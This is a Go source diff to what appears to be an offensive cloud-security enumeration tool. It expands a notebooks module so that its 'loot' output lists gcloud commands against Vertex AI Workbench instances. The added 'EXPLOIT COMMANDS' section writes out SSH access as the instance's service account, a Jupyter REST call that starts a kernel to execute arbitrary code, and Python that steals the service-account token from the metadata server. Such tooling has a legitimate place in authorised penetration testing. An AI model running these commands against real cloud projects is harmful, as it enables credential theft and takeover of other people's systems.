@@ -156,10 +156,14 @@ func (m *NotebooksModule) addToLoot(projectID string, instance notebooksservice.
 		return
 	}
 	lootFile.Contents += fmt.Sprintf(
-		"## Instance: %s (Project: %s, Location: %s)\n"+
+		"# =============================================================================\n"+
+			"# NOTEBOOK: %s\n"+
+			"# =============================================================================\n"+
+			"# Project: %s, Location: %s\n"+
 			"# State: %s, Service Account: %s\n"+
 			"# Public IP: %s, Proxy Access: %s\n",
-		instance.Name, instance.ProjectID, instance.Location,
+		instance.Name,
+		instance.ProjectID, instance.Location,
 		instance.State, instance.ServiceAccount,
 		shared.BoolToYesNo(!instance.NoPublicIP), shared.BoolToYesNo(!instance.NoProxyAccess),
 	)
@@ -169,18 +173,81 @@ func (m *NotebooksModule) addToLoot(projectID string, instance notebooksservice.
 			"# Proxy URI: %s\n", instance.ProxyUri)
 	}
 
+	lootFile.Contents += fmt.Sprintf(`
+# === ENUMERATION COMMANDS ===
+
+# Describe instance:
+gcloud notebooks instances describe %s --location=%s --project=%s
+
+# Get JupyterLab proxy URL:
+gcloud notebooks instances describe %s --location=%s --project=%s --format='value(proxyUri)'
+
+# Start instance (if stopped):
+gcloud notebooks instances start %s --location=%s --project=%s
+
+# Stop instance:
+gcloud notebooks instances stop %s --location=%s --project=%s
+
+# Get instance metadata (service account, network config):
+gcloud notebooks instances describe %s --location=%s --project=%s --format=json | jq '{serviceAccount: .serviceAccount, network: .network, subnet: .subnet}'
+
+`,
+		instance.Name, instance.Location, instance.ProjectID,
+		instance.Name, instance.Location, instance.ProjectID,
+		instance.Name, instance.Location, instance.ProjectID,
+		instance.Name, instance.Location, instance.ProjectID,
+		instance.Name, instance.Location, instance.ProjectID,
+	)
+
+	// === EXPLOIT COMMANDS ===
+	lootFile.Contents += "# === EXPLOIT COMMANDS ===\n\n"
+
+	// SSH to notebook instance
+	if !instance.NoPublicIP {
+		lootFile.Contents += fmt.Sprintf(
+			"# SSH to notebook instance (runs as SA: %s):\n"+
+				"gcloud compute ssh --project=%s --zone=%s notebook-instance-%s\n\n",
+			instance.ServiceAccount,
+			instance.ProjectID, instance.Location, instance.Name,
+		)
+	}
 	lootFile.Contents += fmt.Sprintf(
-		"\n# Describe instance:\n"+
-			"gcloud notebooks instances describe %s --location=%s --project=%s\n\n"+
-			"# Get JupyterLab proxy URL:\n"+
-			"gcloud notebooks instances describe %s --location=%s --project=%s --format='value(proxyUri)'\n\n"+
-			"# Start instance (if stopped):\n"+
-			"gcloud notebooks instances start %s --location=%s --project=%s\n\n"+
-			"# Stop instance:\n"+
-			"gcloud notebooks instances stop %s --location=%s --project=%s\n\n",
-		instance.Name, instance.Location, instance.ProjectID,
-		instance.Name, instance.Location, instance.ProjectID,
-		instance.Name, instance.Location, instance.ProjectID,
+		"# SSH through IAP (if direct SSH blocked or no public IP):\n"+
+			"gcloud compute ssh notebook-instance-%s --tunnel-through-iap --project=%s --zone=%s\n\n",
+		instance.Name, instance.ProjectID, instance.Location,
+	)
+
+	// JupyterLab code execution
+	if instance.ProxyUri != "" {
+		lootFile.Contents += fmt.Sprintf(
+			"# Execute code via Jupyter API (runs as SA: %s):\n"+
+				"# Access JupyterLab: %s\n\n"+
+				"# Create and execute a notebook via Jupyter REST API:\n"+
+				"# Step 1: Get Jupyter token (via proxy auth)\n"+
+				"# Step 2: Execute arbitrary code:\n"+
+				"curl -X POST '%s/api/kernels' -H 'Content-Type: application/json' -d '{\"name\": \"python3\"}'\n\n"+
+				"# Execute Python code to steal SA token:\n"+
+				"# In JupyterLab terminal or notebook cell:\n"+
+				"# import requests\n"+
+				"# r = requests.get('http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token', headers={'Metadata-Flavor': 'Google'})\n"+
+				"# print(r.json())\n\n",
+			instance.ServiceAccount,
+			instance.ProxyUri,
+			instance.ProxyUri,
+		)
+	} else {
+		lootFile.Contents += fmt.Sprintf(
+			"# Start instance to get Jupyter proxy URL, then execute code as SA: %s\n"+
+				"gcloud notebooks instances start %s --location=%s --project=%s\n\n",
+			instance.ServiceAccount,
+			instance.Name, instance.Location, instance.ProjectID,
+		)
+	}
+
+	// Upload notebook with code execution
+	lootFile.Contents += fmt.Sprintf(
+		"# Register an instance (Vertex AI Workbench):\n"+
+			"gcloud notebooks instances register %s --location=%s --project=%s\n\n",
 		instance.Name, instance.Location, instance.ProjectID,
 	)
 }
